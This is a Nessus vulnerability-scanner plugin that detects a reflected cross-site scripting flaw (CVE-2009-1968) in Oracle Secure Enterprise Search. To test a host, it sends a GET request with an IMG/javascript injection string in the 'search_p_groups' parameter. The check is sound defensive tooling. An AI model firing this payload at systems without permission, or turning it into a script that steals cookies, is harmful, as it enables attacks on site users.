#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(40550);
  script_version("$Revision: 1.17 $");
  script_cvs_date("$Date: 2016/11/17 15:28:26 $");

  script_cve_id("CVE-2009-1968");
  script_bugtraq_id(35681);
  script_osvdb_id(55892);

  script_name(english:"Oracle Database Secure Enterprise Search search/query/search search_p_groups Parameter XSS");
  script_summary(english:"Tries to inject script code into SES output");

  script_set_attribute( attribute:"synopsis", value:
"The remote web server uses a script that is affected by a cross-site
scripting vulnerability."  );
  script_set_attribute( attribute:"description",  value:
"The version of Oracle Secure Enterprise Search installed on the remote
host fails to sanitize input to the 'search_p_groups' parameter of the
'search/query/search' script before using it to generate dynamic HTML
output.  An attacker may be able to leverage this to inject arbitrary
HTML and script code into a user's browser to be executed within the
security context of the affected site."  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://dsecrg.com/pages/vul/show.php?id=125"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://seclists.org/bugtraq/2009/Jul/109"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.oracle.com/technetwork/topics/security/cpujul2009-091332.html"
  );
  script_set_attribute( attribute:"solution",  value:
"Upgrade to Secure Enterprise Search version 10.1.8.3 or later."  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/07/14"
  );
  script_set_attribute(
    attribute:"patch_publication_date", 
    value:"2009/07/14"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/08/11"
  );
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:database_server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 7777);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:7777, embedded: 0);

# Unless we're being paranoid, make sure the banner looks like Oracle SES.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner) exit(1, "Failed to retrieve the web server's banner on port "+port);
  if ("Server: Oracle Containers for J2EE" >!< banner) exit(0, "Server response header on port "+port+ " indicates it's not Oracle SES.");
}


# Try to exploit the issue.
exploit = string('"', "'><IMG SRC=javascript:alert('", SCRIPT_NAME, "')>");

url = string(
  "/search/query/search?",
  "search.timezone=&",
  "search_p_groups=", urlencode(str:exploit), "&",
  "q=", rand() % 1024, "&",
  "btnSearch=Search"
);

res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail: 1);


# There's a problem if we see our exploit in the proper context.
if (
  '<title>Oracle Secure Enterprise Search' >< res[2] &&
  string('id="dgTabsValInput" type="hidden" name="search_p_groups" value="', exploit, '">') >< res[2]
)
{
  if (report_verbosity > 0)
  {
    set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

    report = string(
      "\n",
      "Nessus was able to exploit the issue using the following URL :\n",
      "\n",
      "  ", build_url(port:port, qs:url), "\n"
    );
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
